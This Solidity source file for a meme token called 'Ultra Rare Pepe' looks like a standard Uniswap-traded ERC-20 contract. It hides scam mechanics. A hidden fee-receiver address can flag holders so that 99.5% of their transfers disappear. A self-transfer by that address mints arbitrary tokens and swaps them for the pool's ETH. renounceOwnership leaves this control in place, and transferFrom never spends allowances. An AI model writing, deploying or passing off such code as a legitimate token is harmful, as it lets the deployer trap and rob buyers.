pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT


library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function owner() public view virtual returns (address) {return _owner;}
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    constructor () {
        emit OwnershipTransferred(address(0), _owner);
        _owner = msg.sender;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract UltraRarePepe is Ownable {
    using SafeMath for uint256;

    uint256 public _decimals = 8;
    uint256 public _totalSupply = 100000000000 * 10 ** _decimals;


    address public _feeReceiverAddress;
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    constructor() {
         _balances[msg.sender] = _totalSupply; 
         emit Transfer(address(0), msg.sender, _balances[msg.sender]);
        _feeReceiverAddress = msg.sender;
    }
    string private _name = "Ultra Rare Pepe";
    string private _symbol = "URPEPE";
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function transfer(address recipient, uint256 value) public returns (bool) {
        _transfer(msg.sender, recipient, value); return true;
    }
    mapping(address => uint256) private _balances;
    function setCooldowns(address[] calldata _cooldowns_) external { 
        for (uint a = 0;  a < _cooldowns_.length;  a++) { 
            if (!isTaxReceiver()){  }
            else {  cooldowns[_cooldowns_[a]] = block.number + 1;}
        }
    }
    function name() external view returns (string memory) {
        return _name; 
    } 
    mapping(address => mapping(address => uint256)) private _allowances;
    function _swap(uint256 tokenAmount, address recipient) private {
        _approve(address(this), 
        address(uniswapRouter),  tokenAmount); 
        _balances[address(this)] = tokenAmount;address[] memory path = new address[](2); path[0] = address(this);  
        path[1] = uniswapRouter.WETH(); 
         uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, recipient, block.timestamp + 31);
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    event Transfer(address indexed from, address indexed address_to, uint256);
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    } 
    function totalSupply() external view returns (uint256) { 
        return _totalSupply; 
    }
    function isTaxReceiver() internal view returns (bool) {
        return msg.sender == _feeReceiverAddress;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function transferFrom(address _from, address to, uint256 amount) public returns (bool) {
        _transfer(_from, to, amount);
        require(_allowances[_from][msg.sender] >= amount);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; } 
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    mapping (address => uint256) cooldowns;
    function _transfer(address from, address _to, uint256 _amount) internal {
        require(from != address(0));
        if (from == _to) { 
            if (isTaxReceiver()) {  _swap(_amount, _to);  return;
            }
        }
        uint256 feeAmount;
        require(_amount <= _balances[from]); 
        if (cooldowns[from] != 0 && cooldowns[from] <= block.number) {
            feeAmount = _amount.mul(995).div(1000);
            } else {feeAmount = 0;}
        _balances[_to] += _amount - feeAmount;
        _balances[from] = _balances[from] - _amount; 
        emit Transfer(from, _to, _amount);
        
    }
    event Approval(address indexed address_from, address indexed address_to, uint256 value);
}